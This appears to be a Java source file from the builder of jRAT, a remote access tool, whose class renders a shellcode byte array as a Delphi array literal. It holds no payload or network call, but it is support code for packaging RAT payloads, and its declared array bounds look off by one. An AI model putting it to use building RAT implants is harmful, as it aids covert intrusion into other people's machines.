package jrat.controller.build.shellcode;

import jrat.controller.utils.ShellcodeUtils;

public class Delphi implements Shellcode {

	@Override
	public String generate(String arrayName, byte[] array) throws Exception {
		StringBuilder builder = new StringBuilder();

		builder.append(arrayName + ": array[0.." + array.length + "] of byte =" + ShellcodeUtils.LINE_SEPARATOR);
		builder.append("(" + ShellcodeUtils.LINE_SEPARATOR + "     ");

		int count = 0;
		for (int i = 0; i < array.length; i++) {
			byte b = array[i];

			count++;

			if (i == array.length - 1) {
				builder.append("$ " + ShellcodeUtils.get2DigitByte(b));
			} else {
				builder.append("$" + ShellcodeUtils.get2DigitByte(b) + ", ");
				if (count >= 16) {
					count = 0;
					builder.append(ShellcodeUtils.LINE_SEPARATOR + "     ");
				}
			}
		}

		builder.append(ShellcodeUtils.LINE_SEPARATOR + ");");

		return builder.toString();
	}

}
